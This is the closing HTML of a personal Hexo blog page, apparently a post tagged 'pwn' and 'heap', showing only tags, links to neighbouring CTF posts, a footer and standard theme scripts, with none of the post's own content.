</div>

          <div class="post-tags">
              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
              <a href="/tags/heap/" rel="tag"><i class="fa fa-tag"></i> heap</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/04/24/polarctf(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/" rel="prev" title="Polar ctf">
                  <i class="fa fa-angle-left"></i> Polar ctf
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/04/27/ctfshow/" rel="next" title="ctfshow">
                  ctfshow <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">leon</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">425k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">6:26</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/le0n-daily" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  

  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.4.0/mermaid.min.js","integrity":"sha256-G8ouPAnw4zzMbnAenHnVz6h9XpKbNdOkrqTh7AadyHs="}}</script>
  <script src="/js/third-party/tags/mermaid.js"></script>


  <script src="/js/third-party/fancybox.js"></script>



  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
